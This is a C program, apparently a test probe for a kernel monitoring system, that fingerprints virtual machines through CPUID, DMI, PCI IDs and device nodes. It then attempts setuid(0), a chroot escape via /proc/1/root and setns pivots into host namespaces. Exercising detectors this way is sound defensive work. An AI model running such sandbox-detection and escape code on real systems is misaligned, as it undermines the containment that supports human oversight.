#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>

static int cpuid_hypervisor_present(void)
{
#if defined(__x86_64__) || defined(__i386__)
    unsigned int eax = 0, ebx = 0, ecx = 0, edx = 0;
    __asm__ volatile("cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(1u), "c"(0u));
    return (ecx >> 31) & 1;
#else
    return 0;
#endif
}

static void cpuid_hypervisor_vendor(char vendor[13])
{
#if defined(__x86_64__) || defined(__i386__)
    unsigned int eax = 0, ebx = 0, ecx = 0, edx = 0;
    __asm__ volatile("cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000u), "c"(0u));
    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);
    vendor[12] = '\0';
#else
    strncpy(vendor, "unknown", 13);
#endif
}

static char *read_file_str(const char *path, char *buf, size_t n)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;
    ssize_t r = read(fd, buf, n - 1);
    close(fd);
    if (r <= 0) return NULL;
    buf[r] = '\0';
    buf[strcspn(buf, "\n")] = '\0';
    return buf;
}

int main(void)
{
    printf("[REP-21] === VM detection and hypervisor escape probe ===\n");

    printf("[REP-21] Stage 1: CPUID hypervisor fingerprinting\n");
    if (cpuid_hypervisor_present()) {
        char vendor[13] = {};
        cpuid_hypervisor_vendor(vendor);
        printf("[REP-21] CPUID leaf 1 ECX bit 31 SET — hypervisor present\n");
        printf("[REP-21] Hypervisor vendor (leaf 0x40000000): '%s'\n", vendor);
    } else {
        printf("[REP-21] CPUID: hypervisor bit not set (bare metal or hardened VM)\n");
    }

    printf("[REP-21] Checking /proc/cpuinfo for 'hypervisor' CPU flag...\n");
    FILE *cinfo = fopen("/proc/cpuinfo", "r");
    if (cinfo) {
        char line[512];
        while (fgets(line, sizeof(line), cinfo)) {
            if (strncmp(line, "flags", 5) == 0 && strstr(line, "hypervisor")) {
                printf("[REP-21] /proc/cpuinfo: 'hypervisor' flag present — VM confirmed\n");
                break;
            }
        }
        fclose(cinfo);
    }

    printf("[REP-21] Stage 2: DMI/SMBIOS enumeration — burst of openat on /sys/class/dmi\n");
    static const char *DMI_FILES[] = {
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/board_vendor",
        "/sys/class/dmi/id/bios_vendor",
        "/sys/class/dmi/id/chassis_vendor",
        "/sys/class/dmi/id/chassis_type",
        "/sys/class/dmi/id/product_uuid",
        "/sys/class/dmi/id/bios_version",
        NULL
    };
    static const char *VM_STRINGS[] = {
        "QEMU", "KVM", "VirtualBox", "VMware", "Bochs",
        "Parallels", "Xen", "Microsoft", NULL
    };

    for (int i = 0; DMI_FILES[i]; i++) {
        char buf[128] = {};
        if (!read_file_str(DMI_FILES[i], buf, sizeof(buf))) continue;
        const char *field = strrchr(DMI_FILES[i], '/') + 1;
        printf("[REP-21] DMI %-20s = '%s'", field, buf);
        for (int j = 0; VM_STRINGS[j]; j++) {
            if (strstr(buf, VM_STRINGS[j])) {
                printf("  << VM signature: %s", VM_STRINGS[j]);
                break;
            }
        }
        printf("\n");
    }

    printf("[REP-21] Stage 3: PCI device scan for QEMU/VirtIO signatures\n");
    static const struct { const char *vid; const char *did; const char *name; } VM_PCI[] = {
        {"0x1234", "0x1111", "QEMU Standard VGA"},
        {"0x1af4", "0x1000", "VirtIO net"},
        {"0x1af4", "0x1001", "VirtIO block"},
        {"0x1af4", "0x1003", "VirtIO console"},
        {"0x1af4", "0x1009", "VirtIO filesystem"},
        {"0x8086", "0x7000", "PIIX3 ISA (QEMU)"},
        {"0x8086", "0x1237", "440FX host bridge (QEMU)"},
        {NULL, NULL, NULL}
    };

    DIR *pci_dir = opendir("/sys/bus/pci/devices");
    if (pci_dir) {
        struct dirent *ent;
        while ((ent = readdir(pci_dir)) != NULL) {
            if (ent->d_name[0] == '.') continue;
            char vid_path[128], did_path[128];
            snprintf(vid_path, sizeof(vid_path),
                     "/sys/bus/pci/devices/%s/vendor", ent->d_name);
            snprintf(did_path, sizeof(did_path),
                     "/sys/bus/pci/devices/%s/device", ent->d_name);
            char vid[16] = {}, did[16] = {};
            read_file_str(vid_path, vid, sizeof(vid));
            read_file_str(did_path, did, sizeof(did));
            for (int i = 0; VM_PCI[i].vid; i++) {
                if (strcmp(vid, VM_PCI[i].vid) == 0
                        && strcmp(did, VM_PCI[i].did) == 0) {
                    printf("[REP-21] VM PCI device: %s %s:%s — %s\n",
                           ent->d_name, vid, did, VM_PCI[i].name);
                }
            }
        }
        closedir(pci_dir);
    }

    printf("[REP-21] Stage 4: Probing hypervisor device nodes\n");
    static const char *VM_DEVS[] = {
        "/dev/kvm",
        "/dev/vhost-net",
        "/dev/vhost-vsock",
        "/dev/vsock",
        "/sys/kernel/debug/kvm",
        "/sys/kernel/vmbus/version",
        "/proc/vz/version",
        "/proc/xen/xenbus",
        NULL
    };
    for (int i = 0; VM_DEVS[i]; i++) {
        int fd = open(VM_DEVS[i], O_RDONLY);
        if (fd >= 0) {
            printf("[REP-21] FOUND: %-40s — VM hypervisor confirmed\n", VM_DEVS[i]);
            close(fd);
        }
    }

    printf("[REP-21] Stage 5: setuid(0) escalation attempt — "
           "fires PrivilegeEscalation kprobe (105)\n");
    if (setuid(0) == 0)
        printf("[REP-21] setuid(0) succeeded — root obtained\n");
    else
        printf("[REP-21] setuid(0) denied: %s (kprobe fired regardless)\n",
               strerror(errno));

    printf("[REP-21] Stage 6: Container/namespace escape attempts\n");

    printf("[REP-21]   Attempting chroot('/proc/1/root') namespace escape...\n");
    if (chroot("/proc/1/root") == 0) {
        printf("[REP-21]   chroot to /proc/1/root SUCCEEDED — escaping container\n");
        chdir("/");
    } else {
        printf("[REP-21]   chroot escape failed: %s (expected inside hardened VM)\n",
               strerror(errno));
    }

    printf("[REP-21]   Attempting setns(/proc/1/ns/pid) PID namespace pivot...\n");
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (pidns_fd >= 0) {
        if (setns(pidns_fd, CLONE_NEWPID) == 0)
            printf("[REP-21]   setns SUCCEEDED — now in host PID namespace\n");
        else
            printf("[REP-21]   setns failed: %s (escape blocked by kernel)\n",
                   strerror(errno));
        close(pidns_fd);
    }

    printf("[REP-21]   Attempting setns(/proc/1/ns/mnt) mount namespace pivot...\n");
    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd >= 0) {
        if (setns(mntns_fd, CLONE_NEWNS) == 0)
            printf("[REP-21]   setns mnt SUCCEEDED — now in host mount namespace\n");
        else
            printf("[REP-21]   setns mnt failed: %s\n", strerror(errno));
        close(mntns_fd);
    }

    printf("[REP-21] VM escape probe complete: CPUID+DMI+PCI+devices+setuid+namespace chain\n");
    return 0;
}
